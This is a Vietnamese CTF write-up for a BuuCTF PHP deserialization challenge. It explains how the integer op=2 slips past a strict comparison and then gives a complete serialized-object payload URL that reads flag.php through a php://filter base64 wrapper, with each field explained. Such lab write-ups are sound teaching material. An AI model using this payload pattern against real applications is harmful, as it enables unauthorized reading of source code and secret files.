![code](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/632a158f-fd89-4aa4-94a2-5309b151285c)

Nhìn vào source code, có thể thấy rằng phương thức GET chuyển vào chuỗi str được tuần tự hóa và phạm vi ASCII của mỗi ký tự trong chuỗi str nằm trong khoảng từ 32 đến 125, sau đó nó được giải tuần tự hóa.

Trong quá trình deserialization, phương thức ``destruct`` được gọi.

```
function __destruct() {
    if($this->op === "2")
        $this->op = "1";
    $this->content = "";
    $this->process();
}
```

Nếu op===="2", hãy gán nó thành "1", đồng thời gán nội dung thành rỗng, nhập hàm xử lý, điều cần chú ý là so sánh giữa op và "2" ở đây là một so sánh kiểu mạnh.

```
public function process() {
    if($this->op == "1") {
        $this->write();
    } else if($this->op == "2") {
        $res = $this->read();
        $this->output($res);
    } else {
        $this->output("Bad Hacker!");
    }
}
```

Sau khi nhập chức năng xử lý, nếu op=="1" thì nhập chức năng ghi, nếu op=="2" thì nhập chức năng đọc, nếu không đầu ra sẽ báo lỗi, có thể thấy sự so sánh giữa op và string ở đây trở thành kiểu yếu So sánh ==.

Vì vậy, chúng ta chỉ cần thực hiện op=2, trong đó 2 là một số nguyên int. Khi op=2, op==="2" là sai, op=="2" là đúng, sau đó nhập hàm đọc.

```
private function read() {
    $res = "";
    if(isset($this->filename)) {
        $res = file_get_contents($this->filename);
    }
    return $res;
}
```

tên tệp là thứ có thể kiểm soát, sau đó sử dụng hàm file_get_contents để đọc tệp, ở đây mình sử dụng giả giao thức ``php://filter`` để đọc tệp và sử dụng hàm đầu ra để xuất tệp sau khi lấy.

```
private function output($s) {
    echo "[Result]: <br>";
    echo $s;
}
```

Đây có thể là Lỗ hổng PHP deserialization, mình thử với payload sau:

``http://b7a04dd1-244c-4f5a-865c-f6788b87f7ee.node4.buuoj.cn:81/?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;}``


  -  "O:11" là mã định danh cho đối tượng, trong trường hợp này là một đối tượng của lớp "FileHandler".
  -  "%22FileHandler%22" là tên của lớp.
  -  "3" là số lượng thuộc tính của đối tượng.
  -  Tiếp theo là các thuộc tính của đối tượng được liệt kê theo định dạng "s:size:"value";", trong đó:
      -  "s" là kiểu dữ liệu của thuộc tính (trong trường hợp này là chuỗi).
      -  "size" là số lượng ký tự của chuỗi.
      -  "value" là giá trị của chuỗi.
  -  ":i:2;" là giá trị của thuộc tính "op" của đối tượng, có kiểu dữ liệu là số nguyên và có giá trị là 2.
  -  ":s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;" là giá trị của thuộc tính "filename" của đối tượng, có kiểu dữ liệu là chuỗi và có giá trị là "php://filter/read=convert.base64-encode/resource=flag.php".
  -  ":s:7:%22content%22;N;" là giá trị của thuộc tính "content" của đối tượng, có kiểu dữ liệu là null.

Khi đoạn mã PHP nhận được giá trị này thông qua biến "str", nó sẽ thực hiện giải mã và tạo ra một đối tượng của lớp "FileHandler" với các thuộc tính tương ứng. Trong trường hợp này, giá trị của thuộc tính "filename" là "php://filter/read=convert.base64-encode/resource=flag.php", tức là yêu cầu đọc nội dung của tệp "flag.php", mã hóa nó bằng Base64 và trả về kết quả.

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/911213cb-13dd-4544-83ed-26f22bd7c605)

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/dab24410-0129-4bd1-a918-3879d9aaaab7)
